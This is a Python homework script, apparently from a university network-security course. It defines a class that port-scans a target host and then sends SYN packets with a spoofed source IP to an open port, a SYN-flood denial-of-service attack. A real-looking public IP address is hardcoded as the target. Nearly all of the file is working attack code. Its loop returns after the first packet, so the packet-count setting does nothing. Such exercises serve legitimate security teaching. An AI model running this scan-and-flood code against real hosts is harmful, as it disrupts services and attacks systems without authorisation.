#!/usr/bin/env python3

"""
Homework Number: #8
Name: Nikita Ravi
ECN Login: ravi30
Due Date: 03/30/2021

"""


from BitVector import *
import sys, socket
from scapy.all import *

class TcpAttack:
    #This entire class was inspired by Professor Avi's Lecture 16 notes

    def __init__(self, spoofIP, targetIP):
        # spoofIP: String containing the IP address to spoof
        # targetIP: String containing the IP address of the target computer to attack

        self.spoofIP = spoofIP
        self.targetIP = targetIP


    def scanTarget(self, rangeStart, rangeEnd):
        # rangeStart: Integer designating the first port in the range of ports being scanned
        # rangeEnd: Integer designating the last port in the range of ports being scanned
        # No return value, but writes open ports to openports.txt

        open_ports = [] #Append all open ports to this list

        #Scan for open ports in the range rangeStart - rangeEnd (inclusive)
        for testport in range(rangeStart, rangeEnd + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # check each port for max 0.6s
            sock.settimeout(0.6)

            try:
                #Try to establish a connection with the target IP address via testport
                sock.connect((self.targetIP, testport))
                open_ports.append(testport) #Append to list if connection established

            except Exception as e:
                print(e)

        # Write all open ports to textfile
        if(len(open_ports)):
            with open("openports.txt", "w") as FILEOUT:
                for port in open_ports:
                    FILEOUT.write(str(port) + "\n")

    def attackTarget(self, port, numSyn):
        # port: Integer designating the port that the attack will use
        # numSyn: Integer of SYN packets to send to target IP address at the given port
        # If the port is open, perform DoS attack and return 1. Otherwise return 0

        # Read from textfile to get list of open ports
        FILEIN = open("openports.txt", "r")
        open_ports = FILEIN.readlines()

        open_ports = [int(i) for i in open_ports]

        #Iterate through numSyn times
        for i in range(numSyn):
            # Check if the port is in the open_ports list
            if(port in open_ports):
                #Creating a Packet
                IP_header = scapy.all.IP(src = self.spoofIP, dst = self.targetIP)
                TCP_header = scapy.all.TCP(flags = "S", sport = RandShort(), dport = port)
                packet = IP_header / TCP_header

                try:
                    #Try to mount an attack on open port
                    send(packet)

                except Exception as e:
                    print(e)

                return 1

            else:
                return 0


if __name__ == "__main__":
    spoofIP = '10.1.1.1'
    targetIP = '128.46.4.83'
    
    rangeStart = 1
    rangeEnd= 23
    port = 22
    
    Tcp = TcpAttack(spoofIP,targetIP)
    Tcp.scanTarget(rangeStart, rangeEnd)

    if Tcp.attackTarget(port, 10):
        print('port was open to attack')
